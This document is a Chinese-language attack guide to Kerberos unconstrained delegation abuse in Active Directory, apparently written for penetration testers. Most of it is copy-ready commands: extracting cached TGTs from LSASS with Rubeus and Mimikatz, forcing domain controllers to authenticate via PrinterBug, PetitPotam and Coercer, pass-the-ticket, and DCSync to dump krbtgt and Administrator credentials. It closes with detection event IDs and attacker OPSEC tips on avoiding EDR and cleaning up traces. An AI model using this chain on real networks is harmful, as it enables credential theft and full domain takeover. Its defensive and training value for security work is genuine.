# 非约束委派攻击详解

## TGT 缓存机制

### 原理

当服务账号或机器账号设置了 `TRUSTED_FOR_DELEGATION` 标志 (UAC bit 524288) 时，用户向该服务发起 Kerberos 认证的过程中，KDC 会将用户的 TGT 嵌入到颁发的 Service Ticket 中。服务端收到 ST 后，将 TGT 提取并缓存到 LSASS 内存，以便后续代表用户访问其他服务。

攻击者控制该服务器后，可从 LSASS 中提取所有缓存的 TGT，冒充任意曾经访问过该服务器的用户。

### TGT 提取方法

```powershell
# Rubeus — 列出所有缓存票据
Rubeus.exe triage

# Rubeus — 导出所有 TGT
Rubeus.exe dump /service:krbtgt /nowrap

# Rubeus — 导出指定 LUID 的 TGT
Rubeus.exe dump /luid:0x3e4 /nowrap

# Mimikatz — 导出票据到文件
mimikatz.exe "sekurlsa::tickets /export"
```

```bash
# Linux — 若已获取 LSASS dump
pypykatz lsa minidump lsass.dmp -k /tmp/tickets
```

---

## Rubeus monitor/dump 模式

### monitor 模式 (推荐)

持续监控 LSASS 中新出现的 TGT，适合等待高权限用户访问或配合强制认证使用:

```powershell
# 基本监控 (每 10 秒检查)
Rubeus.exe monitor /interval:10 /nowrap

# 过滤特定用户
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$

# 过滤特定用户 + 自动续期
Rubeus.exe monitor /interval:5 /nowrap /filteruser:Administrator /renewtickets
```

输出示例:
```
[*] Monitoring every 5 seconds for new TGTs
[*] Found new TGT:
  User                  :  DC01$@DOMAIN.LOCAL
  StartTime             :  2026/04/23 10:00:00
  EndTime               :  2026/04/23 20:00:00
  RenewTill             :  2026/04/30 10:00:00
  ServiceName           :  krbtgt/DOMAIN.LOCAL
  Base64EncodedTicket   :  doIFwj[...]MuSU8=
```

### dump 模式

一次性导出当前所有缓存票据:

```powershell
# 导出所有 krbtgt 票据
Rubeus.exe dump /service:krbtgt /nowrap

# 导出后导入使用
Rubeus.exe ptt /ticket:<BASE64_TGT>
```

---

## 强制认证触发

当没有高权限用户主动访问非约束委派服务器时，需要主动触发 DC 或其他高权限机器向该服务器发起认证。

### PrinterBug (MS-RPRN)

**原理**: 利用 Print Spooler 服务的 `RpcRemoteFindFirstPrinterChangeNotificationEx` API，强制目标机器向指定主机发起认证。目标需运行 Print Spooler 服务 (默认启用)。

```bash
# SpoolSample (Windows)
SpoolSample.exe <TARGET_DC> <UNCONSTRAINED_MACHINE>

# SharpSpoolTrigger (Windows)
SharpSpoolTrigger.exe <TARGET_DC> <UNCONSTRAINED_MACHINE>

# printerbug.py (Linux)
printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_DC> <UNCONSTRAINED_MACHINE>
```

### PetitPotam (MS-EFSRPC)

**原理**: 利用 EFS RPC 接口 (`EfsRpcOpenFileRaw` 等) 强制目标机器向指定主机发起认证。

```bash
# PetitPotam.py (Linux)
PetitPotam.py -u <USER> -p <PASSWORD> -d <DOMAIN> <UNCONSTRAINED_MACHINE> <TARGET_DC>

# 无凭据版本 (未打补丁时)
PetitPotam.py '' '' <UNCONSTRAINED_MACHINE> <TARGET_DC>
```

### Coercer (集成工具)

集成多种强制认证方法 (MS-RPRN, MS-EFSRPC, MS-FSRVP, MS-DFSNM 等):

```bash
# 自动尝试所有方法
coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> \
  -l <UNCONSTRAINED_MACHINE> -t <TARGET_DC>

# 仅列出可用方法
coercer scan -u <USER> -p <PASSWORD> -d <DOMAIN> -t <TARGET_DC>
```

---

## 完整利用步骤

从强制认证到 DCSync 的完整流程:

```powershell
# === 在非约束委派服务器上 ===

# 1. 启动 TGT 监控
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
```

```bash
# === 在攻击机上 ===

# 2. 触发强制认证
coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> \
  -l <UNCONSTRAINED_MACHINE> -t <DC_IP>
```

```powershell
# === 回到非约束委派服务器 ===

# 3. 获取到 DC 的 TGT (Base64)
# [*] Found new TGT: DC01$@DOMAIN.LOCAL
# Base64EncodedTicket: doIFwj[...]

# 4. 导入票据
Rubeus.exe ptt /ticket:doIFwj[...]

# 5. DCSync
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
```

```bash
# === Linux 替代方案 ===

# 将 Base64 票据转为 ccache
echo '<BASE64_TGT>' | base64 -d > dc01.kirbi
ticketConverter.py dc01.kirbi dc01.ccache

# DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass '<DOMAIN>/DC01$@dc01.<DOMAIN>'
```

---

## OPSEC 与检测

### 检测指标

| 事件 | Event ID | 说明 |
|------|----------|------|
| 登录事件 | 4624 (Type 3) | 高权限账户从非约束委派服务器发起网络登录 |
| 票据请求 | 4768 | TGT 请求来自非预期来源 |
| 票据使用 | 4769 | 使用 DC 机器账号票据执行 DCSync |
| 服务调用 | 5145 | 来自非预期源的 SMB/RPC 调用 |

### 蓝队检测要点

- 监控非约束委派服务器上的 Event ID 4624 (Logon Type 3)
- 关注 DC 机器账号从非预期来源发起的认证
- 监控 Print Spooler RPC 调用 (`MS-RPRN`)
- 监控 EFS RPC 调用 (`MS-EFSRPC`)
- 告警 DCSync 行为 (Event ID 4662, GUID `1131f6ad-...`)

### 攻击方注意事项

- DC 默认配置非约束委派，攻击 DC 本身无意义 — 目标是非 DC 的非约束委派机器
- 强制认证会在目标和攻击者双方留下日志
- Rubeus monitor 会持续查询 LSASS，可能触发 EDR
- 尽快使用捕获的 TGT，默认有效期 10 小时
- 操作完成后清理导出的票据文件
